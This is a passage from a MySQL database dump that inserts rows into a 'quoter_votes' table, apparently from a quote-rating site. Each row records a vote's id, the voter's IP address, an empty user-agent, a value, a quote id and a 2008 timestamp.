  (8784,'195.14.49.230','',0,222,1230547008),
  (8785,'195.14.49.230','',0,218,1230547011),
  (8786,'195.14.49.230','',0,208,1230547024),
  (8787,'195.14.49.230','',0,206,1230547025),
  (8788,'195.14.49.230','',0,204,1230547029),
  (8789,'195.14.49.230','',0,201,1230547032),
  (8790,'195.14.49.230','',0,199,1230547036),
  (8791,'195.14.49.230','',0,197,1230547039),
  (8792,'195.14.49.230','',0,195,1230547041),
  (8793,'195.14.49.230','',0,189,1230547046),
  (8794,'195.14.49.230','',0,185,1230547047),
  (8795,'195.14.49.230','',0,177,1230547053),
  (8796,'93.85.34.160','',0,300,1230547553),
  (8797,'93.85.34.160','',0,302,1230547556),
  (8798,'66.249.66.47','',0,185,1230548714),
  (8799,'156.17.237.13','',0,303,1230548767),
  (8800,'195.39.196.252','',0,302,1230549178),
  (8801,'84.204.148.130','',0,303,1230549422),
  (8802,'93.85.34.160','',0,299,1230549506),
  (8803,'84.204.148.130','',0,299,1230549563),
  (8804,'195.39.196.252','',0,297,1230549660),
  (8805,'195.39.196.252','',0,291,1230549693),
  (8806,'217.117.89.14','',0,231,1230549928),
  (8807,'62.106.113.131','',0,302,1230550105),
  (8808,'74.6.22.154','',0,98,1230550257),
  (8809,'195.39.196.252','',0,287,1230550514),
  (8810,'195.39.196.252','',0,258,1230550560),
  (8811,'195.39.196.252','',0,246,1230550568),
  (8812,'195.39.196.252','',0,163,1230550574),
  (8813,'66.249.66.47','',0,62,1230551001),
  (8814,'66.249.66.47','',0,227,1230551080),
  (8815,'93.183.242.70','',0,274,1230551226),
  (8816,'93.183.242.70','',0,279,1230551251),
  (8817,'93.183.242.70','',0,263,1230551290),
  (8818,'93.183.242.70','',0,254,1230551428),
  (8819,'93.183.242.70','',0,6,1230551715),
  (8820,'93.183.242.70','',0,4,1230551734),
  (8821,'81.19.66.84','',0,247,1230551874),
  (8822,'93.183.242.70','',0,62,1230551917),
  (8823,'93.183.242.70','',0,61,1230551921),
  (8824,'81.19.66.84','',0,248,1230552176),
  (8825,'66.249.66.47','',0,298,1230552269),
  (8826,'93.183.242.70','',0,164,1230552321),
  (8827,'93.183.242.70','',0,185,1230552413),
  (8828,'81.19.66.84','',0,249,1230552427),
  (8829,'81.19.66.84','',0,250,1230552431),
  (8830,'81.19.66.84','',0,286,1230552587),
  (8831,'81.19.66.84','',0,287,1230552724),
  (8832,'81.19.66.84','',0,288,1230552783),
  (8833,'81.19.66.84','',0,289,1230552785),
  (8834,'217.119.20.82','',0,1,1230552801),
  (8835,'217.119.20.82','',0,55,1230552807),
  (8836,'81.19.66.84','',0,290,1230552854),
  (8837,'81.19.66.84','',0,291,1230552856),
  (8838,'64.1.215.165','',0,156,1230552857),
  (8839,'217.119.20.82','',0,29,1230552862),
  (8840,'81.19.66.84','',0,292,1230552901),
  (8841,'217.119.20.82','',0,18,1230553116),
  (8842,'74.6.22.154','',0,141,1230553298),
  (8843,'213.184.248.166','',0,176,1230553716),
  (8844,'213.184.248.166','',0,8,1230553724),
  (8845,'213.184.248.166','',0,9,1230554404),
  (8846,'213.184.248.166','',0,13,1230554422),
  (8847,'213.184.248.166','',0,302,1230554446),
  (8848,'213.184.248.166','',0,297,1230554506),
  (8849,'213.184.248.166','',0,291,1230554548),
  (8850,'213.184.248.166','',0,288,1230554613),
  (8851,'213.184.248.166','',0,287,1230554651),
  (8852,'66.249.66.47','',0,54,1230555908),
  (8853,'195.91.131.170','',0,302,1230556271),
  (8854,'66.249.66.47','',0,38,1230556497),
  (8855,'74.6.22.154','',0,220,1230556776),
  (8856,'80.255.64.45','',0,289,1230557152),
  (8857,'84.204.148.130','',0,299,1230557186),
  (8858,'84.204.148.130','',0,298,1230557188),
  (8859,'84.204.148.130','',0,292,1230557224),
  (8860,'84.204.148.130','',0,286,1230557270),
  (8861,'194.190.194.146','',0,292,1230558052),
  (8862,'91.202.197.79','',0,305,1230558336),
  (8863,'91.202.197.79','',0,304,1230558356),
  (8864,'91.202.197.79','',0,302,1230558363),
  (8865,'91.202.197.79','',0,299,1230558368),
  (8866,'193.93.218.67','',0,298,1230558391),
  (8867,'193.93.218.67','',0,299,1230558423),
  (8868,'194.190.194.146','',0,262,1230558444),
  (8869,'93.85.34.160','',0,299,1230558452),
  (8870,'193.93.218.67','',0,302,1230558475),
  (8871,'194.190.194.146','',0,238,1230558654),
  (8872,'81.18.116.69','',0,298,1230558818),
  (8873,'81.18.116.69','',0,302,1230558843),
  (8874,'93.185.182.24','',0,305,1230560303),
  (8875,'213.33.216.246','',0,299,1230560596),
  (8876,'194.190.194.146','',0,120,1230560715),
  (8877,'64.1.215.165','',0,120,1230560741),
  (8878,'95.24.43.250','',0,305,1230560763),
  (8879,'213.33.216.246','',0,298,1230560770),
  (8880,'193.93.218.67','',0,306,1230561790),
  (8881,'74.6.22.154','',0,258,1230561907),
  (8882,'194.44.221.46','',0,292,1230563068),
  (8883,'82.207.125.180','',0,306,1230563164),
  (8884,'82.207.125.180','',0,286,1230563248),
  (8885,'82.207.125.180','',0,227,1230563367),
  (8886,'88.84.200.91','',0,306,1230563496),
  (8887,'195.22.104.2','',0,197,1230564651),
  (8888,'195.22.104.2','',0,195,1230564661),
  (8889,'195.22.104.2','',0,173,1230564896),
  (8890,'195.22.104.2','',0,133,1230566121),
  (8891,'92.112.214.89','',0,304,1230566314),
  (8892,'64.1.215.165','',0,199,1230566330),
  (8893,'93.85.34.160','',0,299,1230566464),
  (8894,'92.242.16.39','',0,299,1230566652),
  (8895,'78.85.24.112','',0,305,1230566847),
  (8896,'77.35.255.159','',0,306,1230567100),
  (8897,'74.6.22.154','',0,111,1230567283),
  (8898,'156.17.237.13','',0,305,1230570040),
  (8899,'156.17.237.13','',0,304,1230570092),
  (8900,'93.84.42.236','',0,299,1230570364),
  (8901,'93.84.42.236','',0,258,1230570404),
  (8902,'84.204.148.130','',0,303,1230571294),
  (8903,'84.204.148.130','',0,299,1230571412),
  (8904,'84.204.148.130','',0,298,1230571871),
  (8905,'84.204.148.130','',0,286,1230572170),
  (8906,'94.25.144.228','',0,306,1230574607),
  (8907,'94.25.144.228','',0,296,1230574890),
  (8908,'94.25.144.228','',0,292,1230574906),
  (8909,'74.6.22.154','',0,218,1230574930),
  (8910,'64.1.215.165','',0,119,1230575228),
  (8911,'88.84.212.18','',0,12,1230575425),
  (8912,'88.84.212.18','',0,9,1230575461),
  (8913,'91.78.116.67','',0,299,1230575499),
  (8914,'80.83.238.239','',0,234,1230575651),
  (8915,'80.83.238.239','',0,54,1230575816),
  (8916,'80.83.238.239','',0,258,1230576320),
  (8917,'78.85.97.54','',0,258,1230576407),
  (8918,'80.83.238.239','',0,163,1230576432),
  (8919,'80.83.238.239','',0,133,1230576517),
  (8920,'80.83.238.239','',0,111,1230576535),
  (8921,'80.83.238.239','',0,70,1230576613),
  (8922,'94.180.72.144','',0,54,1230577658),
  (8923,'85.172.47.55','',0,113,1230577668),
  (8924,'79.171.124.210','',0,306,1230578387),
  (8925,'64.1.215.165','',0,136,1230578494),
  (8926,'74.6.22.154','',0,236,1230578580),
  (8927,'67.195.37.171','',0,283,1230578948),
  (8928,'81.19.66.84','',0,102,1230579360),
  (8929,'81.19.66.84','',0,103,1230579364),
  (8930,'81.19.66.84','',0,104,1230580115),
  (8931,'81.19.66.84','',0,105,1230580122),
  (8932,'81.19.66.84','',0,106,1230580479),
  (8933,'81.19.66.84','',0,107,1230580914),
  (8934,'81.19.66.84','',0,109,1230580922),
  (8935,'74.6.22.154','',0,297,1230580985),
  (8936,'81.19.66.84','',0,114,1230581245),
  (8937,'81.19.66.84','',0,115,1230581604),
  (8938,'81.19.66.84','',0,119,1230581606),
  (8939,'93.84.42.236','',0,299,1230581762),
  (8940,'93.84.42.236','',0,298,1230581766),
  (8941,'81.19.66.84','',0,120,1230581921),
  (8942,'81.19.66.84','',0,122,1230581923),
  (8943,'87.252.245.148','',0,305,1230582078),
  (8944,'81.19.66.84','',0,124,1230582157),
  (8945,'87.252.245.148','',0,298,1230582206),
  (8946,'87.252.245.148','',0,286,1230582387),
  (8947,'81.19.66.84','',0,129,1230582387),
  (8948,'81.19.66.84','',0,13,1230582395),
  (8949,'87.252.245.148','',0,279,1230582414),
  (8950,'87.252.245.148','',0,274,1230582482),
  (8951,'81.19.66.84','',0,137,1230582710),
  (8952,'87.252.245.148','',0,54,1230582874),
  (8953,'81.19.66.84','',0,14,1230582991),
  (8954,'81.19.66.84','',0,140,1230582999),
  (8955,'81.19.66.84','',0,141,1230583189),
  (8956,'81.19.66.84','',0,142,1230583195),
  (8957,'81.19.66.84','',0,145,1230583342),
  (8958,'77.108.92.108','',0,304,1230583364),
  (8959,'81.19.66.84','',0,146,1230583503),
  (8960,'81.19.66.84','',0,154,1230583508),
  (8961,'87.252.245.148','',0,262,1230583531),
  (8962,'77.108.92.108','',0,291,1230583539),
  (8963,'77.108.92.108','',0,274,1230583649),
  (8964,'81.19.66.84','',0,155,1230583667),
  (8965,'81.19.66.84','',0,156,1230583672),
  (8966,'77.108.92.108','',0,270,1230583787),
  (8967,'77.108.92.108','',0,264,1230583797),
  (8968,'81.19.66.84','',0,157,1230583841),
  (8969,'81.19.66.84','',0,159,1230583846),
  (8970,'81.19.66.84','',0,16,1230584043),
  (8971,'77.108.92.108','',0,263,1230584114),
  (8972,'81.19.66.84','',0,161,1230584180),
  (8973,'81.19.66.84','',0,164,1230584185),
  (8974,'77.108.92.108','',0,262,1230584194),
  (8975,'81.19.66.84','',0,172,1230584377),
  (8976,'81.19.66.84','',0,173,1230584378),
  (8977,'81.19.66.84','',0,175,1230584583),
  (8978,'92.241.182.24','',0,215,1230584585),
  (8979,'77.108.92.108','',0,238,1230584587),
  (8980,'74.6.22.154','',0,143,1230584667),
  (8981,'81.19.66.84','',0,176,1230584722),
  (8982,'81.19.66.84','',0,177,1230584731),
  (8983,'74.6.22.154','',0,50,1230584807),
  (8984,'77.108.92.108','',0,204,1230584940),
  (8985,'81.19.66.84','',0,18,1230584941),
  (8986,'90.188.182.67','',0,286,1230585004),
  (8987,'81.19.66.84','',0,185,1230585089),
  (8988,'81.19.66.84','',0,189,1230585256),
  (8989,'81.19.66.84','',0,195,1230585259),
  (8990,'81.19.66.84','',0,20,1230585405),
  (8991,'64.1.215.165','',0,165,1230585411),
  (8992,'81.19.66.84','',0,25,1230585600),
  (8993,'81.19.66.84','',0,283,1230585603),
  (8994,'89.113.208.195','',0,304,1230585726),
  (8995,'89.113.208.195','',0,303,1230585782),
  (8996,'81.19.66.84','',0,286,1230585785),
  (8997,'87.252.245.148','',0,212,1230585785),
  (8998,'89.113.208.195','',0,305,1230585869),
  (8999,'81.19.66.84','',0,287,1230585918),
  (9000,'81.19.66.84','',0,288,1230586097);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 9000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (9001,'81.19.66.84','',0,289,1230586114),
  (9002,'85.140.64.170','',0,305,1230586151),
  (9003,'85.140.64.170','',0,304,1230586166),
  (9004,'81.19.66.84','',0,29,1230586292),
  (9005,'81.19.66.84','',0,290,1230586473),
  (9006,'81.19.66.84','',0,291,1230586475),
  (9007,'89.113.208.195','',0,202,1230586526),
  (9008,'89.113.208.195','',0,106,1230586609),
  (9009,'89.113.208.195','',0,129,1230586655),
  (9010,'81.19.66.84','',0,292,1230586661),
  (9011,'89.113.208.195','',0,255,1230586754),
  (9012,'81.19.66.84','',0,296,1230586822),
  (9013,'89.113.208.195','',0,251,1230586852),
  (9014,'74.6.22.154','',0,238,1230586889),
  (9015,'89.113.208.195','',0,249,1230586908),
  (9016,'89.139.244.140','',0,298,1230586996),
  (9017,'81.19.66.84','',0,30,1230586997),
  (9018,'81.19.66.84','',0,38,1230587005),
  (9019,'89.113.208.195','',0,234,1230587045),
  (9020,'81.19.66.84','',0,39,1230587170),
  (9021,'81.19.66.84','',0,48,1230587176),
  (9022,'89.113.208.195','',0,215,1230587293),
  (9023,'81.19.66.84','',0,53,1230587356),
  (9024,'89.113.208.195','',0,190,1230587387),
  (9025,'81.19.66.84','',0,54,1230587544),
  (9026,'81.19.66.84','',0,56,1230587555),
  (9027,'81.19.66.84','',0,6,1230587739),
  (9028,'81.19.66.84','',0,61,1230587744),
  (9029,'81.19.66.84','',0,63,1230587928),
  (9030,'81.19.66.84','',0,66,1230587932),
  (9031,'81.19.66.84','',0,67,1230588101),
  (9032,'81.19.66.84','',0,68,1230588276),
  (9033,'81.19.66.84','',0,69,1230588289),
  (9034,'81.19.66.84','',0,70,1230588445),
  (9035,'81.19.66.84','',0,71,1230588450),
  (9036,'81.19.66.84','',0,75,1230588645),
  (9037,'81.19.66.84','',0,76,1230588762),
  (9038,'81.19.66.84','',0,79,1230588765),
  (9039,'195.91.198.193','',0,305,1230588837),
  (9040,'81.19.66.84','',0,8,1230588895),
  (9041,'81.19.66.84','',0,80,1230589042),
  (9042,'81.19.66.84','',0,81,1230589049),
  (9043,'195.91.198.193','',0,297,1230589088),
  (9044,'195.91.198.193','',0,286,1230589171),
  (9045,'81.19.66.84','',0,86,1230589248),
  (9046,'81.19.66.84','',0,90,1230589251),
  (9047,'81.19.66.84','',0,96,1230589378),
  (9048,'195.91.198.193','',0,215,1230589434),
  (9049,'81.19.66.84','',0,98,1230589512),
  (9050,'195.91.198.193','',0,119,1230589528),
  (9051,'195.91.198.193','',0,56,1230589554),
  (9052,'90.151.92.116','',0,307,1230589555),
  (9053,'84.242.216.248','',0,307,1230591173),
  (9054,'84.242.216.248','',0,308,1230592471),
  (9055,'193.138.147.22','',0,308,1230593736),
  (9056,'193.138.147.22','',0,307,1230593813),
  (9057,'193.138.147.22','',0,306,1230593815),
  (9058,'193.138.147.22','',0,305,1230593825),
  (9059,'193.138.147.22','',0,304,1230593835),
  (9060,'193.138.147.22','',0,303,1230593851),
  (9061,'193.138.147.22','',0,299,1230593932),
  (9062,'193.138.147.22','',0,298,1230593958),
  (9063,'193.138.147.22','',0,297,1230593987),
  (9064,'193.138.147.22','',0,287,1230594318),
  (9065,'193.138.147.22','',0,283,1230594363),
  (9066,'193.138.147.22','',0,279,1230594404),
  (9067,'78.24.225.246','',0,1,1230594414),
  (9068,'78.24.225.246','',0,55,1230594418),
  (9069,'193.138.147.22','',0,265,1230594550),
  (9070,'193.138.147.22','',0,258,1230594577),
  (9071,'193.138.147.22','',0,255,1230594648),
  (9072,'193.138.147.22','',0,249,1230594825),
  (9073,'193.138.147.22','',0,245,1230594974),
  (9074,'74.6.22.154','',0,147,1230594998),
  (9075,'193.138.147.22','',0,227,1230595255),
  (9076,'193.138.147.22','',0,221,1230595388),
  (9077,'91.202.197.79','',0,305,1230595845),
  (9078,'91.202.197.79','',0,299,1230595860),
  (9079,'91.202.197.79','',0,303,1230596037),
  (9080,'91.202.197.79','',0,212,1230596069),
  (9081,'91.202.197.79','',0,286,1230596116),
  (9082,'91.202.197.79','',0,259,1230596132),
  (9083,'64.1.215.165','',0,204,1230596814),
  (9084,'217.132.164.13','',0,298,1230599847),
  (9085,'80.243.71.189','',0,1,1230600494),
  (9086,'80.243.71.189','',0,55,1230600496),
  (9087,'74.6.22.154','',0,245,1230601552),
  (9088,'67.195.37.171','',0,296,1230602489),
  (9089,'74.6.22.154','',0,135,1230603310),
  (9090,'74.6.22.154','',0,243,1230604802),
  (9091,'74.6.22.154','',0,30,1230611661),
  (9092,'74.6.22.154','',0,219,1230613637),
  (9093,'67.195.37.171','',0,296,1230614103),
  (9094,'74.6.22.154','',0,146,1230614734),
  (9095,'77.88.30.246','',0,53,1230615086),
  (9096,'77.88.30.246','',0,286,1230615097),
  (9097,'77.88.30.246','',0,144,1230615117),
  (9098,'77.88.30.246','',0,175,1230615128),
  (9099,'77.88.30.246','',0,287,1230615144),
  (9100,'77.88.30.246','',0,218,1230615166),
  (9101,'77.88.30.246','',0,147,1230615178),
  (9102,'77.88.30.246','',0,24,1230615196),
  (9103,'77.88.30.246','',0,164,1230615213),
  (9104,'77.88.30.246','',0,233,1230615234),
  (9105,'77.88.30.246','',0,159,1230615243),
  (9106,'77.88.30.246','',0,152,1230615255),
  (9107,'77.88.30.246','',0,87,1230615272),
  (9108,'77.88.30.246','',0,129,1230615279),
  (9109,'77.88.30.246','',0,291,1230615286),
  (9110,'77.88.30.246','',0,106,1230615296),
  (9111,'77.88.30.246','',0,190,1230615311),
  (9112,'77.88.30.246','',0,223,1230615318),
  (9113,'77.88.30.246','',0,145,1230615328),
  (9114,'77.88.30.246','',0,274,1230615336),
  (9115,'77.88.30.246','',0,104,1230615346),
  (9116,'77.88.30.246','',0,23,1230615353),
  (9117,'77.88.30.246','',0,60,1230615362),
  (9118,'92.47.242.136','',0,55,1230615364),
  (9119,'92.47.242.136','',0,1,1230615367),
  (9120,'77.88.30.246','',0,172,1230615369),
  (9121,'77.88.30.246','',0,13,1230615381),
  (9122,'77.88.30.246','',0,135,1230615401),
  (9123,'77.88.30.246','',0,86,1230615441),
  (9124,'77.88.30.246','',0,120,1230615446),
  (9125,'77.88.30.246','',0,154,1230615461),
  (9126,'92.47.242.136','',0,258,1230615473),
  (9127,'77.88.30.246','',0,128,1230615488),
  (9128,'77.88.30.246','',0,199,1230615503),
  (9129,'77.88.30.246','',0,103,1230615509),
  (9130,'77.88.30.246','',0,9,1230615524),
  (9131,'77.88.30.246','',0,125,1230615531),
  (9132,'77.88.30.246','',0,29,1230615561),
  (9133,'77.88.30.246','',0,214,1230615572),
  (9134,'77.88.30.246','',0,263,1230615588),
  (9135,'77.88.30.246','',0,222,1230615601),
  (9136,'77.88.30.246','',0,270,1230615620),
  (9137,'77.88.30.246','',0,156,1230615655),
  (9138,'77.88.30.246','',0,220,1230615670),
  (9139,'77.88.30.246','',0,184,1230615704),
  (9140,'77.88.30.246','',0,258,1230615775),
  (9141,'77.88.30.246','',0,114,1230615786),
  (9142,'77.88.30.246','',0,255,1230615834),
  (9143,'77.88.30.246','',0,83,1230615841),
  (9144,'77.88.30.246','',0,157,1230615867),
  (9145,'77.88.30.246','',0,212,1230615878),
  (9146,'77.88.30.246','',0,119,1230615887),
  (9147,'77.88.30.246','',0,178,1230615918),
  (9148,'77.88.30.246','',0,136,1230615925),
  (9149,'77.88.30.246','',0,185,1230615965),
  (9150,'77.88.30.246','',0,140,1230615978),
  (9151,'77.88.30.246','',0,139,1230615996),
  (9152,'77.88.30.246','',0,118,1230616023),
  (9153,'77.88.30.246','',0,183,1230616036),
  (9154,'77.88.30.246','',0,133,1230616044),
  (9155,'77.88.30.246','',0,259,1230616053),
  (9156,'77.88.30.246','',0,11,1230616096),
  (9157,'77.88.30.246','',0,138,1230616118),
  (9158,'77.88.30.246','',0,264,1230616128),
  (9159,'77.88.30.246','',0,84,1230616156),
  (9160,'77.88.30.246','',0,216,1230616169),
  (9161,'77.88.30.246','',0,202,1230616187),
  (9162,'77.88.30.246','',0,110,1230616190),
  (9163,'77.88.30.246','',0,173,1230616200),
  (9164,'77.88.30.246','',0,161,1230616209),
  (9165,'77.88.30.246','',0,61,1230616230),
  (9166,'77.88.30.246','',0,107,1230616243),
  (9167,'77.88.30.246','',0,215,1230616246),
  (9168,'77.88.30.246','',0,56,1230616263),
  (9169,'77.88.30.246','',0,85,1230616288),
  (9170,'77.88.30.246','',0,272,1230616303),
  (9171,'77.88.30.246','',0,290,1230616324),
  (9172,'77.88.30.246','',0,205,1230616345),
  (9173,'77.88.30.246','',0,288,1230616352),
  (9174,'77.88.30.246','',0,240,1230616361),
  (9175,'77.88.30.246','',0,238,1230616368),
  (9176,'77.88.30.246','',0,189,1230616382),
  (9177,'77.88.30.246','',0,247,1230616405),
  (9178,'77.88.30.246','',0,207,1230616425),
  (9179,'77.88.30.246','',0,213,1230616436),
  (9180,'77.88.30.246','',0,38,1230616460),
  (9181,'77.88.30.246','',0,230,1230616490),
  (9182,'77.88.30.246','',0,39,1230616537),
  (9183,'77.88.30.246','',0,54,1230616554),
  (9184,'77.88.30.246','',0,235,1230616582),
  (9185,'77.88.30.246','',0,143,1230616590),
  (9186,'77.88.30.246','',0,201,1230616602),
  (9187,'77.88.30.246','',0,155,1230616614),
  (9188,'77.88.30.246','',0,109,1230616625),
  (9189,'67.195.37.171','',0,283,1230616632),
  (9190,'77.88.30.246','',0,113,1230616633),
  (9191,'77.88.30.246','',0,124,1230616647),
  (9192,'77.88.30.246','',0,195,1230616675),
  (9193,'77.88.30.246','',0,279,1230616683),
  (9194,'77.88.30.246','',0,44,1230616692),
  (9195,'77.88.30.246','',0,55,1230616706),
  (9196,'77.88.30.246','',0,229,1230616713),
  (9197,'77.88.30.246','',0,234,1230616715),
  (9198,'77.88.30.246','',0,208,1230616727),
  (9199,'77.88.30.246','',0,105,1230616747),
  (9200,'77.88.30.246','',0,48,1230616770),
  (9201,'77.88.30.246','',0,297,1230616784),
  (9202,'74.6.22.154','',0,251,1230616803),
  (9203,'77.88.30.246','',0,163,1230616806),
  (9204,'77.88.30.246','',0,108,1230616832),
  (9205,'77.88.30.246','',0,289,1230616841),
  (9206,'77.88.30.246','',0,137,1230616857),
  (9207,'77.88.30.246','',0,58,1230616880),
  (9208,'77.88.30.246','',0,122,1230616885),
  (9209,'77.88.30.246','',0,203,1230616895),
  (9210,'77.88.30.246','',0,50,1230616900),
  (9211,'77.88.30.246','',0,299,1230616916),
  (9212,'77.88.30.246','',0,81,1230616929),
  (9213,'77.88.30.246','',0,283,1230616964),
  (9214,'77.88.30.246','',0,292,1230616972),
  (9215,'77.88.30.246','',0,204,1230616978),
  (9216,'77.88.30.246','',0,146,1230616982),
  (9217,'77.88.30.246','',0,231,1230616992),
  (9218,'93.185.182.24','',0,310,1230617020),
  (9219,'77.88.30.246','',0,142,1230617067),
  (9220,'77.88.30.246','',0,219,1230617088),
  (9221,'77.88.30.246','',0,265,1230617149),
  (9222,'77.88.30.246','',0,14,1230617189),
  (9223,'77.88.30.246','',0,227,1230617302),
  (9224,'77.88.30.246','',0,141,1230617326),
  (9225,'74.6.22.154','',0,58,1230617376),
  (9226,'77.88.30.246','',0,80,1230617391),
  (9227,'77.88.30.246','',0,165,1230617397),
  (9228,'77.88.30.246','',0,30,1230617431),
  (9229,'77.88.30.246','',0,221,1230617447),
  (9230,'77.88.30.246','',0,25,1230617458),
  (9231,'77.88.30.246','',0,206,1230617462),
  (9232,'77.88.30.246','',0,236,1230617476),
  (9233,'77.88.30.246','',0,115,1230617478),
  (9234,'77.88.30.246','',0,197,1230617509),
  (9235,'77.88.30.246','',0,177,1230617542),
  (9236,'77.88.30.246','',0,256,1230617583),
  (9237,'77.88.30.246','',0,130,1230617616),
  (9238,'77.88.30.246','',0,262,1230617639),
  (9239,'77.88.30.246','',0,88,1230617696),
  (9240,'77.88.30.246','',0,74,1230617759),
  (9241,'74.6.22.154','',0,306,1230617907),
  (9242,'77.88.30.246','',0,111,1230617934),
  (9243,'74.6.22.154','',0,231,1230618826),
  (9244,'74.6.22.154','',0,205,1230619756),
  (9245,'64.1.215.165','',0,256,1230621271),
  (9246,'217.74.160.60','',0,303,1230621955),
  (9247,'74.6.22.154','',0,235,1230622207),
  (9248,'84.204.76.118','',0,311,1230623081),
  (9249,'74.6.22.154','',0,70,1230623493),
  (9250,'74.6.22.154','',0,77,1230624600),
  (9251,'66.249.66.47','',0,288,1230624717),
  (9252,'74.6.22.154','',0,88,1230624784),
  (9253,'83.217.0.35','',0,279,1230625148),
  (9254,'66.249.66.47','',0,287,1230625538),
  (9255,'74.6.22.154','',0,307,1230625556),
  (9256,'74.6.22.154','',0,309,1230625596),
  (9257,'74.6.22.154','',0,304,1230625600),
  (9258,'74.6.22.154','',0,310,1230625606),
  (9259,'74.6.22.154','',0,305,1230625632),
  (9260,'74.6.22.154','',0,311,1230625663),
  (9261,'92.125.82.172','',0,130,1230625681),
  (9262,'74.6.22.154','',0,303,1230625726),
  (9263,'92.125.82.172','',0,289,1230625810),
  (9264,'74.6.22.154','',0,312,1230625897),
  (9265,'74.6.22.154','',0,308,1230625957),
  (9266,'81.25.46.86','',0,250,1230626911),
  (9267,'212.26.136.22','',0,310,1230627290),
  (9268,'81.25.46.86','',0,309,1230627313),
  (9269,'78.24.231.133','',0,55,1230627405),
  (9270,'78.24.231.133','',0,1,1230627406),
  (9271,'82.116.46.212','',0,311,1230627694),
  (9272,'212.26.136.22','',0,113,1230627791),
  (9273,'212.26.136.22','',0,88,1230627803),
  (9274,'74.6.22.154','',0,73,1230627870),
  (9275,'82.116.46.212','',0,299,1230627904),
  (9276,'82.116.46.212','',0,298,1230627912),
  (9277,'66.249.66.47','',0,309,1230627912),
  (9278,'82.116.46.212','',0,292,1230627952),
  (9279,'66.249.66.47','',0,308,1230628035),
  (9280,'82.116.46.212','',0,290,1230628223),
  (9281,'62.213.85.55','',0,270,1230628350),
  (9282,'66.249.66.47','',0,310,1230628401),
  (9283,'64.1.215.165','',0,138,1230629540),
  (9284,'66.249.66.47','',0,291,1230630538),
  (9285,'64.1.215.165','',0,84,1230631111),
  (9286,'66.249.66.47','',0,299,1230631135),
  (9287,'66.249.66.47','',0,306,1230631732),
  (9288,'193.93.218.67','',0,306,1230631856),
  (9289,'82.207.120.10','',0,304,1230632596),
  (9290,'82.207.120.10','',0,297,1230632600),
  (9291,'82.207.120.10','',0,291,1230632607),
  (9292,'93.84.45.62','',0,299,1230632851),
  (9293,'66.249.66.47','',0,288,1230633614),
  (9294,'77.52.193.18','',0,311,1230633616),
  (9295,'77.52.193.18','',0,312,1230633618),
  (9296,'77.52.193.18','',0,310,1230633628),
  (9297,'77.52.193.18','',0,309,1230633654),
  (9298,'77.52.193.18','',0,308,1230633662),
  (9299,'77.52.193.18','',0,307,1230633668),
  (9300,'77.52.193.18','',0,306,1230633679),
  (9301,'77.52.193.18','',0,305,1230633684),
  (9302,'77.52.193.18','',0,304,1230633693),
  (9303,'195.135.212.210','',0,287,1230634234),
  (9304,'195.135.212.210','',0,274,1230634242),
  (9305,'80.243.4.222','',0,312,1230634432),
  (9306,'80.243.4.222','',0,311,1230634443),
  (9307,'80.243.4.222','',0,310,1230634456),
  (9308,'91.201.1.254','',0,215,1230634630),
  (9309,'80.243.4.222','',0,305,1230634642),
  (9310,'74.6.22.154','',0,234,1230634771),
  (9311,'66.249.66.47','',0,11,1230635035),
  (9312,'74.6.22.154','',0,184,1230635793),
  (9313,'74.6.22.154','',0,241,1230636091),
  (9314,'195.39.196.252','',0,215,1230636504),
  (9315,'77.122.245.211','',0,298,1230636688),
  (9316,'89.178.217.182','',0,246,1230636859),
  (9317,'81.25.46.86','',0,259,1230637691),
  (9318,'91.195.246.200','',0,311,1230639139),
  (9319,'74.6.22.154','',0,146,1230639375),
  (9320,'84.52.108.220','',0,296,1230639428),
  (9321,'74.6.22.154','',0,230,1230639545),
  (9322,'91.195.246.200','',0,173,1230639666),
  (9323,'74.6.22.154','',0,221,1230640014),
  (9324,'74.6.22.154','',0,24,1230641283),
  (9325,'212.98.179.118','',0,312,1230641632),
  (9326,'212.98.179.118','',0,310,1230641663),
  (9327,'212.98.179.118','',0,55,1230641787),
  (9328,'93.84.45.62','',0,299,1230641951),
  (9329,'66.249.66.47','',0,238,1230641999),
  (9330,'212.98.179.118','',0,299,1230642097),
  (9331,'212.98.179.118','',0,85,1230642416),
  (9332,'212.98.179.118','',0,84,1230642447),
  (9333,'212.98.179.118','',0,12,1230642545),
  (9334,'66.249.66.47','',0,11,1230642797),
  (9335,'213.208.171.146','',0,311,1230643037),
  (9336,'66.249.66.47','',0,62,1230643768),
  (9337,'89.232.129.102','',0,279,1230644186),
  (9338,'89.232.129.102','',0,274,1230644203),
  (9339,'74.6.22.154','',0,136,1230644261),
  (9340,'89.232.129.102','',0,250,1230644357),
  (9341,'89.232.129.102','',0,238,1230644380),
  (9342,'66.249.66.47','',0,298,1230644413),
  (9343,'66.249.66.47','',0,303,1230644535),
  (9344,'94.180.15.224','',0,312,1230644883),
  (9345,'81.25.46.86','',0,312,1230644956),
  (9346,'82.207.125.180','',0,312,1230645118),
  (9347,'221.11.27.110','',0,299,1230645133),
  (9348,'75.64.35.123','',0,299,1230645145),
  (9349,'61.53.137.50','',0,299,1230645156),
  (9350,'202.106.121.134','',0,299,1230645161),
  (9351,'82.207.125.180','',0,306,1230645166),
  (9352,'221.224.108.84','',0,299,1230645173),
  (9353,'221.91.128.132','',0,299,1230645177),
  (9354,'212.191.130.227','',0,299,1230645178),
  (9355,'218.97.194.94','',0,299,1230645183),
  (9356,'62.118.0.4','',0,54,1230645290),
  (9357,'93.84.42.61','',0,299,1230645302),
  (9358,'82.207.125.180','',0,311,1230645505),
  (9359,'74.6.22.154','',0,242,1230645715),
  (9360,'64.1.215.165','',0,227,1230645977),
  (9361,'93.84.42.61','',0,298,1230646458),
  (9362,'74.6.22.154','',0,213,1230646481),
  (9363,'91.202.197.79','',0,312,1230646937),
  (9364,'91.202.197.79','',0,311,1230646944),
  (9365,'91.202.197.79','',0,310,1230646944),
  (9366,'91.202.197.79','',0,305,1230646959),
  (9367,'91.202.197.79','',0,299,1230646977),
  (9368,'74.6.22.154','',0,241,1230647394),
  (9369,'74.6.22.154','',0,222,1230648206),
  (9370,'74.6.22.154','',0,303,1230649112),
  (9371,'66.249.66.47','',0,312,1230649330),
  (9372,'74.6.22.154','',0,139,1230649487),
  (9373,'74.6.22.154','',0,118,1230649793),
  (9374,'64.1.215.165','',0,152,1230650071),
  (9375,'94.25.147.237','',0,311,1230650843),
  (9376,'94.25.147.237','',0,310,1230650851),
  (9377,'94.25.147.237','',0,306,1230650872),
  (9378,'94.25.147.237','',0,303,1230650901),
  (9379,'81.25.55.17','',0,299,1230654189),
